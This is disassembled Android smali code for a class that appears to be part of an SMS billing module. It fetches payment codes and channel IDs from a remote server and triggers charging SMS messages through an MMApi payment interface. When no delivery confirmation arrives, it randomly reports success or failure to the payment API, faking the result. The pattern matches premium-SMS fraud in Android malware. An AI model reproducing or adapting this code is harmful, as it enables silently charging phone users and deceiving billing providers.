.class public Lorg/zzf/core/c/z;
.super Ljava/lang/Object;


# instance fields
.field public a:Z

.field public b:Z

.field private c:Landroid/content/Context;

.field private d:Ljava/lang/String;

.field private e:Z

.field private f:Ljava/lang/String;

.field private g:Ljava/lang/String;

.field private h:Lorg/apache/http/HttpResponse;

.field private i:Lorg/zzf/core/d/z;

.field private j:Ljava/lang/String;

.field private k:Lcom/zp/mm/api/SMSResponse;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 2

    const/4 v1, 0x0

    const/4 v0, 0x0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-boolean v1, p0, Lorg/zzf/core/c/z;->a:Z

    iput-boolean v1, p0, Lorg/zzf/core/c/z;->b:Z

    iput-boolean v1, p0, Lorg/zzf/core/c/z;->e:Z

    iput-object v0, p0, Lorg/zzf/core/c/z;->f:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/z;->g:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/z;->h:Lorg/apache/http/HttpResponse;

    iput-object v0, p0, Lorg/zzf/core/c/z;->j:Ljava/lang/String;

    iput-object p1, p0, Lorg/zzf/core/c/z;->c:Landroid/content/Context;

    return-void
.end method

.method private a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    .locals 7

    const/4 v6, 0x0

    const/4 v0, 0x0

    invoke-static {}, Lorg/zzf/core/b/h;->a()Lorg/zzf/core/b/h;

    invoke-static {p1, v0}, Lorg/zzf/core/b/h;->i(Landroid/content/Context;I)V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "&"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "contentid="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lorg/zzf/core/c/z;->g:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v6, v6}, Lorg/zzf/core/f/o;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)[Lorg/apache/http/Header;

    move-result-object v1

    invoke-static {v0, v1, p1}, Lorg/zzf/core/f/o;->a(Ljava/lang/String;[Lorg/apache/http/Header;Landroid/content/Context;)Lorg/apache/http/HttpResponse;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-static {v0, p1}, Lorg/zzf/core/f/o;->a(Lorg/apache/http/HttpResponse;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_0

    :try_start_0
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v0, "appkey"

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v0, "paycode"

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v3, "channelid"

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v3, "exdata"

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v5

    :try_start_1
    invoke-static {v0}, Ljava/lang/Long;->valueOf(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v2

    move-object v0, p1

    invoke-static/range {v0 .. v5}, Lcom/zp/mm/api/android/MMApi;->getSms(Landroid/content/Context;Ljava/lang/String;JLjava/lang/String;Ljava/lang/String;)Lcom/zp/mm/api/SMSResponse;

    move-result-object v0

    iput-object v0, p0, Lorg/zzf/core/c/z;->k:Lcom/zp/mm/api/SMSResponse;

    new-instance v0, Landroid/content/Intent;

    const-string v1, "zhang.pay.sms.send"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/4 v1, 0x0

    const/4 v2, 0x0

    invoke-static {p1, v1, v0, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-string v2, "zhang.pay.sms.send.delivery"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/4 v2, 0x0

    const/4 v3, 0x0

    invoke-static {p1, v2, v1, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    iget-object v2, p0, Lorg/zzf/core/c/z;->k:Lcom/zp/mm/api/SMSResponse;

    invoke-interface {v2, v0, v1}, Lcom/zp/mm/api/SMSResponse;->requestSendMessage(Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    invoke-static {}, Lorg/zzf/core/b/h;->a()Lorg/zzf/core/b/h;

    const/4 v0, 0x3

    invoke-static {p1, v0}, Lorg/zzf/core/b/h;->i(Landroid/content/Context;I)V

    invoke-direct {p0, p1}, Lorg/zzf/core/c/z;->a(Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/lang/NumberFormatException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Lcom/zp/mm/api/MMApiException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1

    :cond_0
    :goto_0
    return-object v6

    :catch_0
    move-exception v0

    :try_start_2
    invoke-virtual {v0}, Ljava/lang/NumberFormatException;->printStackTrace()V
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_0

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    invoke-static {}, Lorg/zzf/core/b/h;->a()Lorg/zzf/core/b/h;

    move-result-object v0

    const/16 v1, 0x3f8

    invoke-virtual {v0, p1, v1}, Lorg/zzf/core/b/h;->e(Landroid/content/Context;I)V

    invoke-static {}, Lorg/zzf/core/a;->a()Lorg/zzf/core/a;

    move-result-object v0

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Lorg/zzf/core/a;->a(I)V

    goto :goto_0

    :catch_2
    move-exception v0

    :try_start_3
    invoke-virtual {v0}, Lcom/zp/mm/api/MMApiException;->printStackTrace()V
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0
.end method

.method private a(Landroid/content/Context;)V
    .locals 6

    const/4 v5, 0x5

    const/4 v1, 0x1

    const/4 v2, 0x0

    iget-object v0, p0, Lorg/zzf/core/c/z;->k:Lcom/zp/mm/api/SMSResponse;

    if-eqz v0, :cond_3

    move v0, v2

    :goto_0
    const/16 v3, 0x1f

    if-ge v0, v3, :cond_1

    const-wide/16 v3, 0x3e8

    :try_start_0
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    invoke-static {}, Lorg/zzf/core/b/h;->a()Lorg/zzf/core/b/h;

    move-result-object v3

    invoke-virtual {v3, p1}, Lorg/zzf/core/b/h;->k(Landroid/content/Context;)I

    move-result v3

    const/16 v4, 0x3e9

    if-ne v3, v4, :cond_0

    invoke-static {p1}, Lorg/zzf/core/b/h;->A(Landroid/content/Context;)I

    move-result v3

    const/4 v4, 0x3

    if-ne v3, v4, :cond_0

    iget-object v0, p0, Lorg/zzf/core/c/z;->k:Lcom/zp/mm/api/SMSResponse;

    invoke-interface {v0}, Lcom/zp/mm/api/SMSResponse;->sendMessageSuccess()V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    move v0, v1

    :goto_1
    if-eq v0, v1, :cond_3

    new-instance v1, Ljava/util/Random;

    invoke-direct {v1}, Ljava/util/Random;-><init>()V

    move v0, v2

    :goto_2
    if-ge v2, v5, :cond_2

    invoke-virtual {v1, v5}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    add-int/lit8 v2, v2, 0x1

    goto :goto_2

    :cond_0
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    :cond_1
    move v0, v2

    goto :goto_1

    :cond_2
    const/4 v1, 0x2

    if-gt v0, v1, :cond_4

    iget-object v0, p0, Lorg/zzf/core/c/z;->k:Lcom/zp/mm/api/SMSResponse;

    invoke-interface {v0}, Lcom/zp/mm/api/SMSResponse;->sendMessageSuccess()V

    :cond_3
    :goto_3
    return-void

    :cond_4
    iget-object v0, p0, Lorg/zzf/core/c/z;->k:Lcom/zp/mm/api/SMSResponse;

    invoke-interface {v0}, Lcom/zp/mm/api/SMSResponse;->sendMessageFailed()V

    goto :goto_3
.end method

.method private a(Lorg/zzf/core/d/aa;)V
    .locals 2

    if-nez p1, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->a()Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->a()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-eqz v0, :cond_0

    invoke-direct {p0, p1}, Lorg/zzf/core/c/z;->b(Lorg/zzf/core/d/aa;)V

    invoke-static {}, Lorg/zzf/core/b/i;->a()Lorg/zzf/core/b/i;

    move-result-object v0

    iget-object v1, p0, Lorg/zzf/core/c/z;->c:Landroid/content/Context;

    invoke-virtual {v0, v1, p1}, Lorg/zzf/core/b/i;->a(Landroid/content/Context;Lorg/zzf/core/d/aa;)V

    goto :goto_0
.end method

.method private b(Lorg/zzf/core/d/aa;)V
    .locals 4

    :try_start_0
    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->a()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    if-nez v2, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    const/4 v0, 0x0

    move v1, v0

    :goto_1
    if-ge v1, v2, :cond_0

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->a()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lorg/zzf/core/d/z;

    iput-object v0, p0, Lorg/zzf/core/c/z;->i:Lorg/zzf/core/d/z;

    iget-object v0, p0, Lorg/zzf/core/c/z;->i:Lorg/zzf/core/d/z;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lorg/zzf/core/c/z;->i:Lorg/zzf/core/d/z;

    invoke-virtual {v0}, Lorg/zzf/core/d/z;->a()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/zzf/core/c/z;->d:Ljava/lang/String;

    iget-object v0, p0, Lorg/zzf/core/c/z;->d:Ljava/lang/String;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lorg/zzf/core/c/z;->d:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    const-string v3, ""

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    iget-object v0, p0, Lorg/zzf/core/c/z;->d:Ljava/lang/String;

    const-string v3, "spMMxy"

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lorg/zzf/core/c/z;->d:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/z;->j:Ljava/lang/String;

    iget-object v0, p0, Lorg/zzf/core/c/z;->c:Landroid/content/Context;

    iget-object v3, p0, Lorg/zzf/core/c/z;->d:Ljava/lang/String;

    invoke-direct {p0, v0, v3}, Lorg/zzf/core/c/z;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_2
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public a(Ljava/util/List;)V
    .locals 4

    if-eqz p1, :cond_1

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_1

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lorg/zzf/core/d/aa;

    const/4 v2, 0x2

    iget-object v3, p0, Lorg/zzf/core/c/z;->c:Landroid/content/Context;

    invoke-static {v2, v3}, Lorg/zzf/core/f/h;->a(ILandroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-direct {p0, v0}, Lorg/zzf/core/c/z;->a(Lorg/zzf/core/d/aa;)V

    goto :goto_0

    :cond_0
    invoke-static {}, Lorg/zzf/core/b/h;->a()Lorg/zzf/core/b/h;

    move-result-object v0

    iget-object v1, p0, Lorg/zzf/core/c/z;->c:Landroid/content/Context;

    const/16 v2, 0x3ed

    invoke-virtual {v0, v1, v2}, Lorg/zzf/core/b/h;->e(Landroid/content/Context;I)V

    :cond_1
    return-void
.end method
